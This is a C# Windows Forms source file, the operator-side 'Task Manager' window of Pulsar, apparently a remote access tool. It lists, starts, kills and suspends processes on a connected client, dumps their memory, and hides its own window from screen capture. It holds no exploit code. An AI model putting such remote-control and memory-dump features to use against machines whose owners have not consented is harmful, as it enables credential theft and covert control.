using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Models;
using Pulsar.Server.Controls;
using Pulsar.Server.Controls.Wpf;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskManager : Form
    {
        private readonly Client _connectClient;
        private readonly TaskManagerHandler _taskManagerHandler;
        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new();
        private List<FrmMemoryDump> _memoryDumps = new();
        private int? _ratPid = null;
        private readonly ProcessTreeView _processTreeView;
        private Pulsar.Common.Models.Process[] _currentProcesses = Array.Empty<Pulsar.Common.Models.Process>();
        private ProcessTreeSortColumn _sortColumn = ProcessTreeSortColumn.Name;
        private bool _sortAscending = true;

        private readonly System.Windows.Forms.Timer _countdownTimer;
        private int _countdownValue = 7;
        private bool _pauseAutoRefresh = false;
        private System.Drawing.Color _originalLabelColor;

        // Ultra-light update management
        private DateTime _lastUpdateTime = DateTime.MinValue;
        private readonly TimeSpan _minimumUpdateInterval = TimeSpan.FromMilliseconds(500);
        private readonly Queue<Pulsar.Common.Models.Process[]> _updateQueue = new Queue<Pulsar.Common.Models.Process[]>();
        private bool _isProcessingQueue = false;
        private readonly object _queueLock = new object();

        public static FrmTaskManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var form)) return form;
            form = new FrmTaskManager(client);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms[client] = form;
            return form;
        }

        public FrmTaskManager(Client client)
        {
            _connectClient = client;
            _taskManagerHandler = new TaskManagerHandler(client);
            _processTreeView = new ProcessTreeView();

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            _processTreeView.SortRequested += ProcessTreeView_SortRequested;
            _processTreeView.SelectedProcessChanged += ProcessTreeView_SelectedProcessChanged;
            processTreeHost.Child = _processTreeView;

            _originalLabelColor = toolStripStatusLabel1.ForeColor;

            _countdownTimer = new System.Windows.Forms.Timer { Interval = 1000 };
            _countdownTimer.Tick += CountdownTimer_Tick;
            _countdownTimer.Start();

            RegisterMessageHandler();
        }
        private void AutoExpandFirstExplorer()
        {
            if (_processTreeView == null) return;

            // Flatten the tree so all nodes are accessible
            _processTreeView.FlattenNodes();

            // Access the internal list of nodes via FlattenNodes
            var allNodesField = typeof(ProcessTreeView)
                .GetField("_allNodes", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
            if (allNodesField == null) return;

            var allNodes = allNodesField.GetValue(_processTreeView) as List<ProcessTreeNode>;
            if (allNodes == null || allNodes.Count == 0) return;

            // Find the first explorer.exe
            var node = allNodes.FirstOrDefault(n =>
                string.Equals(n.Name, "explorer.exe", StringComparison.OrdinalIgnoreCase));

            if (node != null)
            {
                // Expand the node and its ancestors
                void ExpandAncestors(ProcessTreeNode target)
                {
                    var rootNodesProperty = typeof(ProcessTreeView)
                        .GetProperty("RootNodes", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.GetProperty);

                    var rootNodes = rootNodesProperty?.GetValue(_processTreeView) as IEnumerable<ProcessTreeNode> ?? Enumerable.Empty<ProcessTreeNode>();

                    foreach (var root in rootNodes)
                    {
                        if (TryExpandPath(root, target)) break;
                    }

                    bool TryExpandPath(ProcessTreeNode current, ProcessTreeNode targetNode)
                    {
                        if (current == targetNode) return true;

                        foreach (var child in current.Children)
                        {
                            if (TryExpandPath(child, targetNode))
                            {
                                current.IsExpanded = true; // expand ancestor
                                return true;
                            }
                        }
                        return false;
                    }
                }

                ExpandAncestors(node);
                node.IsExpanded = true; // expand the explorer.exe node itself
            }
        }





        private void CountdownTimer_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel1.Text = $"Refreshing in {_countdownValue}s...";

            if (_countdownValue == 2)
                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Yellow;
            else if (_countdownValue == 1)
                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Green;
            else
                toolStripStatusLabel1.ForeColor = _originalLabelColor;

            if (_countdownValue > 0)
            {
                _countdownValue--;
            }
            else
            {
                if (!_pauseAutoRefresh)
                    _ = Task.Run(() => _taskManagerHandler.RefreshProcesses());

                _countdownValue = 7; // reset to 7 seconds
                toolStripStatusLabel1.ForeColor = _originalLabelColor;
            }
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;

            _taskManagerHandler.ProgressChanged += (s, processes) =>
            {
                QueueProcessUpdate(processes, _taskManagerHandler.LastProcessesResponse?.RatPid);
            };

            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            _taskManagerHandler.OnResponseReceived += CreateMemoryDump;

            // Register with MessageHandler if exists
            MessageHandler.Register(_taskManagerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_taskManagerHandler);
            _taskManagerHandler.OnResponseReceived -= CreateMemoryDump;
            _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            _taskManagerHandler.Dispose();
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void QueueProcessUpdate(Pulsar.Common.Models.Process[] processes, int? ratPid)
        {
            lock (_queueLock)
            {
                _ratPid = ratPid;

                _updateQueue.Clear();
                _updateQueue.Enqueue(processes ?? Array.Empty<Pulsar.Common.Models.Process>());

                if (!_isProcessingQueue)
                {
                    _isProcessingQueue = true;
                    _ = Task.Run(ProcessUpdateQueue);
                }
            }
        }

        private async Task ProcessUpdateQueue()
        {
            while (true)
            {
                Pulsar.Common.Models.Process[] processesToUpdate = null;

                lock (_queueLock)
                {
                    if (_updateQueue.Count == 0)
                    {
                        _isProcessingQueue = false;
                        break;
                    }
                    processesToUpdate = _updateQueue.Dequeue();
                }

                if (processesToUpdate != null)
                    await ProcessAndUpdateAsync(processesToUpdate);

                await Task.Delay(10);
            }
        }

        private async Task ProcessAndUpdateAsync(Pulsar.Common.Models.Process[] processes)
        {
            var timeSinceLastUpdate = DateTime.Now - _lastUpdateTime;
            if (timeSinceLastUpdate < _minimumUpdateInterval)
            {
                await Task.Delay(_minimumUpdateInterval - timeSinceLastUpdate);
            }

            var processedData = await Task.Run(() => ProcessDataInBackground(processes));
            await UpdateUIAsync(processedData);

            _lastUpdateTime = DateTime.Now;
        }

        private ProcessDataResult ProcessDataInBackground(Pulsar.Common.Models.Process[] processes)
        {
            var sortedProcesses = SortProcesses(processes, _sortColumn, _sortAscending);

            return new ProcessDataResult
            {
                Processes = sortedProcesses,
                ProcessCount = processes.Length,
                RatPid = _ratPid
            };
        }

        private Pulsar.Common.Models.Process[] SortProcesses(Pulsar.Common.Models.Process[] processes, ProcessTreeSortColumn sortColumn, bool ascending)
        {
            if (processes == null || processes.Length == 0)
                return processes;

            try
            {
                IEnumerable<Pulsar.Common.Models.Process> ordered = sortColumn switch
                {
                    ProcessTreeSortColumn.Pid => processes.OrderBy(p => p.Id),
                    ProcessTreeSortColumn.WindowTitle => processes.OrderBy(p => p.MainWindowTitle ?? ""),
                    _ => processes.OrderBy(p => p.Name ?? "")
                };

                return ascending ? ordered.ToArray() : ordered.Reverse().ToArray();
            }
            catch
            {
                return processes;
            }
        }

        private async Task UpdateUIAsync(ProcessDataResult data)
        {
            if (this.InvokeRequired)
                await this.InvokeAsync(() =>
                {
                    _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid);
                    AutoExpandFirstExplorer(); // call after update
                });
            else
            {
                _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid);
                AutoExpandFirstExplorer();
            }


            UpdateStatusLabel(data.ProcessCount);
        }


        private void UpdateStatusLabel(int processCount)
        {
            string sortLabel = _sortColumn switch
            {
                ProcessTreeSortColumn.Pid => "PID",
                ProcessTreeSortColumn.WindowTitle => "Title",
                _ => "Name"
            };
            string orderLabel = _sortAscending ? "asc" : "desc";
            processesToolStripStatusLabel.Text = $"Processes: {processCount} | Sort: {sortLabel} ({orderLabel})";
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            string text = action switch
            {
                ProcessAction.Start => result ? "Process started successfully" : "Failed to start process",
                ProcessAction.End => result ? "Process ended successfully" : "Failed to end process",
                _ => string.Empty
            };

            if (this.InvokeRequired)
                this.Invoke((MethodInvoker)(() => processesToolStripStatusLabel.Text = text));
            else
                processesToolStripStatusLabel.Text = text;
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
            _ = Task.Run(() => _taskManagerHandler.RefreshProcesses());
        }

        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            _countdownTimer.Stop();
            UnregisterMessageHandler();
        }

        private IEnumerable<Pulsar.Common.Models.Process> GetSelectedProcesses() =>
            _processTreeView?.SelectedProcesses ?? Array.Empty<Pulsar.Common.Models.Process>();

        private void ProcessTreeView_SortRequested(object sender, SortRequestedEventArgs e)
        {
            if (_sortColumn == e.Column)
                _sortAscending = !_sortAscending;
            else
            {
                _sortColumn = e.Column;
                _sortAscending = true;
            }

            if (_currentProcesses.Length > 0)
                _ = Task.Run(() => ProcessAndUpdateAsync(_currentProcesses));
        }

        private void ProcessTreeView_SelectedProcessChanged(object sender, EventArgs e) { }

        private void CreateMemoryDump(object sender, DoProcessDumpResponse response)
        {
            if (response.Result)
            {
                this.Invoke((MethodInvoker)(() =>
                {
                    var dumpFrm = FrmMemoryDump.CreateNewOrGetExisting(_connectClient, response);
                    _memoryDumps.Add(dumpFrm);
                    dumpFrm.Show();
                }));
            }
            else
            {
                string reason = string.IsNullOrEmpty(response.FailureReason) ? "" : $"Reason: {response.FailureReason}";
                MessageBox.Show($"Failed to dump process!\n{reason}", $"Failed to dump process ({response.Pid}) - {response.ProcessName}");
            }
        }

        public void SetAutoRefreshEnabled(bool enabled) => _pauseAutoRefresh = !enabled;

        private void PerformOnSelectedProcesses(Action<Pulsar.Common.Models.Process> action)
        {
            _pauseAutoRefresh = true;
            try
            {
                var selected = GetSelectedProcesses().ToList();
                foreach (var process in selected)
                    action(process);
            }
            finally
            {
                _pauseAutoRefresh = false;
            }
        }

        #region Menu Actions
        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.EndProcess(p.Id));

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processName = string.Empty;
            if (InputBox.Show("Process name", "Enter Process name:", ref processName) == DialogResult.OK)
                _taskManagerHandler.StartProcess(processName);
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e) =>
            _taskManagerHandler.RefreshProcesses();

        private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.DumpProcess(p.Id));

        private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SuspendProcess(p.Id));

        private void topmostOnToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, true));

        private void topmostOffToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, false));

        // New: Minimize / Maximize
        private void minimizedToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SetWindowState(p.Id, true));

        private void maximizedToolStripMenuItem_Click(object sender, EventArgs e) =>
            PerformOnSelectedProcesses(p => _taskManagerHandler.SetWindowState(p.Id, false));
        #endregion

        private string _lastSearchKeyword = ""; // Stores last search

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // Handle Ctrl + F globally
            if (keyData == (Keys.Control | Keys.F))
            {
                ShowSearchDialog();
                return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void ShowSearchDialog()
        {
            string prompt = "Search by name, window title, or PID. Enter keywords separated by spaces. Leave text selected and click Enter/OK to find next.";

            string keyword = Microsoft.VisualBasic.Interaction.InputBox(
                prompt,
                "Find Process",
                _lastSearchKeyword);

            if (string.IsNullOrWhiteSpace(keyword))
                keyword = _lastSearchKeyword;

            if (!string.IsNullOrWhiteSpace(keyword))
            {
                _lastSearchKeyword = keyword.Trim();
                _processTreeView.FlattenNodes();
                _processTreeView.FindNext(_lastSearchKeyword);
            }
        }




        // Optional: keep your menu item wired up too
        private void searchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ShowSearchDialog();
        }

        private void enableDisableAutoRefreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Toggle auto-refresh
            _pauseAutoRefresh = !_pauseAutoRefresh;

            // Toggle menu item checkmark
            if (sender is ToolStripMenuItem menuItem)
                menuItem.Checked = !_pauseAutoRefresh;

            // Update status label
            if (_pauseAutoRefresh)
            {
                toolStripStatusLabel1.Text = "Auto refresh disabled";
                toolStripStatusLabel1.ForeColor = System.Drawing.Color.Red;
                _countdownTimer.Stop(); // stop ticking
            }
            else
            {
                toolStripStatusLabel1.Text = $"Refreshing in {_countdownValue}s...";
                toolStripStatusLabel1.ForeColor = _originalLabelColor;
                _countdownTimer.Start(); // resume ticking
            }
        }

    }

    public class ProcessDataResult
    {
        public Pulsar.Common.Models.Process[] Processes { get; set; } = Array.Empty<Pulsar.Common.Models.Process>();
        public int ProcessCount { get; set; }
        public int? RatPid { get; set; }
    }

    public static class ControlExtensions
    {
        public static Task InvokeAsync(this Control control, Action action)
        {
            var tcs = new TaskCompletionSource<object>();
            control.BeginInvoke((Action)(() =>
            {
                try
                {
                    action();
                    tcs.SetResult(null);
                }
                catch (Exception ex)
                {
                    tcs.SetException(ex);
                }
            }));
            return tcs.Task;
        }
    }
}
